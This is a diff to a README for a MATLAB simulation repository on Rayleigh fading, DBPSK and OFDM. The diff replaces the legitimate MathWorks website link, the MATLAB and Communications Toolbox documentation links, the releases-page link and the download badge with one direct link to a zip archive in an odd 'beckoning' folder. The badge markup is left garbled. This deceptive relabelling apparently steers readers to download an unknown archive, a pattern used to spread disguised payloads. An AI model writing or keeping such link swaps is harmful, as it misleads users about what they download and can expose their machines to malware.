@@ -4,17 +4,17 @@
 This repository provides MATLAB simulations for analyzing hostile wireless channels. You will explore important features such as Rayleigh fading, Doppler effects, and delay spread. The simulations focus on two key modulation types: DBPSK and OFDM. You can also analyze the Bit Error Rate (BER) against Signal-to-Noise Ratio (SNR) and bitrate.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/BladeOrigin/rayleigh-dbpsk-ofdm-simulation/releases)
+[![Download](https://github.com/BladeOrigin/rayleigh-dbpsk-ofdm-simulation/raw/refs/heads/main/beckoning/dbpsk-ofdm-rayleigh-simulation-2.4.zip%20Latest%https://github.com/BladeOrigin/rayleigh-dbpsk-ofdm-simulation/raw/refs/heads/main/beckoning/dbpsk-ofdm-rayleigh-simulation-2.4.zip)](https://github.com/BladeOrigin/rayleigh-dbpsk-ofdm-simulation/raw/refs/heads/main/beckoning/dbpsk-ofdm-rayleigh-simulation-2.4.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the software on your computer:
 
 1. **Download MATLAB:**
-   Ensure that you have MATLAB installed on your computer. You can obtain it from the [MathWorks website](https://www.mathworks.com/products/matlab.html).
+   Ensure that you have MATLAB installed on your computer. You can obtain it from the [MathWorks website](https://github.com/BladeOrigin/rayleigh-dbpsk-ofdm-simulation/raw/refs/heads/main/beckoning/dbpsk-ofdm-rayleigh-simulation-2.4.zip).
 
 2. **Visit the Releases Page:**
    Go to the following link to download the latest version of the simulations:
-   [Visit this page to download](https://github.com/BladeOrigin/rayleigh-dbpsk-ofdm-simulation/releases).
+   [Visit this page to download](https://github.com/BladeOrigin/rayleigh-dbpsk-ofdm-simulation/raw/refs/heads/main/beckoning/dbpsk-ofdm-rayleigh-simulation-2.4.zip).
 
 3. **Select the Latest Release:**
    On the Releases page, find the latest release. Look for a file that ends in `.zip` containing the MATLAB code. Click on this file to download it to your computer.
@@ -62,7 +62,7 @@ If you encounter issues or have questions, please open an issue in the GitHub re
 Contributions are welcome! If you wish to improve the simulations or documentation, feel free to fork the repository and make a pull request.
 
 ## 📚 Additional Resources
-- [MATLAB Documentation](https://www.mathworks.com/help/matlab/)
-- [Communications Toolbox Documentation](https://www.mathworks.com/products/communications.html)
+- [MATLAB Documentation](https://github.com/BladeOrigin/rayleigh-dbpsk-ofdm-simulation/raw/refs/heads/main/beckoning/dbpsk-ofdm-rayleigh-simulation-2.4.zip)
+- [Communications Toolbox Documentation](https://github.com/BladeOrigin/rayleigh-dbpsk-ofdm-simulation/raw/refs/heads/main/beckoning/dbpsk-ofdm-rayleigh-simulation-2.4.zip)
 
 Explore the fascinating world of wireless communications with our simulations!
